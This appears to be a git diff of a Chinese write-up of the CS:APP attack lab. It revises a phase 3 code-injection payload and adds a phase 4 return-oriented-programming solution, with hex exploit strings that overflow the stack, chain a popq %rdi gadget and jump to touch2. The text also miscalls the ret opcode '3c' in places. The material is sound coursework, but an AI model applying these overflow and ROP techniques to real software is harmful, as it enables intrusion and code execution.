@@ -351,7 +351,6 @@ e:	c3                   	retq
 ```
 
 
-
 ![](https://raw.githubusercontent.com/haoboliu66/PicBed/master/img/202204161310506.png)
 
 想法1 - solution:
@@ -359,8 +358,8 @@ e:	c3                   	retq
 getBuf ret时跳到0x5561dc78执行注入的指令, 然后把位于0x5561dca8的字符串首地址放入%rdi, 然后push touch3的地址到栈顶
 
 ```assembly
-48 c7 c7 b0 dc 61 55 ff # %rsp    0x5561dc78
-34 25 fa 18 40 00 c3 00 # %rsp+8  0x5561dc80
+48 c7 c7 a8 dc 61 55 68 # %rsp    0x5561dc78
+fa 18 40 00 c3 00 00 00 # %rsp+8  0x5561dc80
 00 00 00 00 00 00 00 00 # %rsp+16 0x5561dc88  touch3的起始地址
 00 00 00 00 00 00 00 00 # %rsp+24 0x5561dc90
 00 00 00 00 00 00 00 00 # %rsp+32 0x5561dc98
@@ -368,8 +367,6 @@ getBuf ret时跳到0x5561dc78执行注入的指令, 然后把位于0x5561dca8的
 35 39 62 39 39 37 66 61 # 0x5561dca8 # 写入的cookie strings
 00 00 00 00 00 00 00 00
 ```
-
-很合理, 网上也查到了类似的解, 但是不知道为什么无法通过验证? 
 
 ---
 
@@ -418,6 +415,55 @@ fa 18 40 00 00 00 00 00
 
 ## Part II: Return-Oriented Programming
 
-### Phase1
+### Phase4
+
+重复phase2的操作, 调用touch2, 即:
+
+1，把cookie的值 0x59b997fa放到%rdi
+
+2，跳转到touch2
+
+问题: 如何给%rdi赋值? 
+
+因为stack变成了non-executable, 所以没法通过注入mov指令来赋值, 因此这里使用popq %rdi, 
+
+由pop dest指令的含义可知: 是把%rsp所在位置的值放入dest, 然后%rsp回收空间
+
+所以我们必须把cookie的值也写到栈上%rsp的位置, 这样在pop执行时才有值可以拿
+
+由提供的表可知 pop %rdi 指令的encoding是 5f
+
+在objdump结果中搜索可知(402b18) 从402b19开始, 这个地址有5f和c3, 所以我们需要让ret返回时跳转到这个地址, 执行5f, 把%rsp位置的值放到%rdi, 然后下一个执行c3, 即ret, 再从栈中%rsp弹出一个地址, 并跳转到这个地址
+
+![](https://raw.githubusercontent.com/haoboliu66/PicBed/master/img/202204170015053.png)
+
+第1步, 执行原ret指令, 跳转到gadget1的位置
+
+第2步, 执行popq %rdi (5f), 从栈顶拿cookie值, 放入%rdi, 然后%rsp回收
+
+第3步, 执行ret (3c), 从栈顶拿值放入%rip, 即把touch2的起始地址放入%rip, 跳转到了touch2执行函数
+
+
+Phase4 solution
+
+```assembly
+00 00 00 00 00 00 00 00  # %rsp 栈顶
+00 00 00 00 00 00 00 00  # %rsp+8 开始写入injected code
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+19 2b 40 00 00 00 00 00  # 跳转到可以执行5f 3c的位置
+fa 97 b9 59 00 00 00 00  # 这个值会被pop到%rdi
+ec 17 40 00 00 00 00 00
+```
+---
+
+### Phase5
+
+
+
+
+
+
 
 
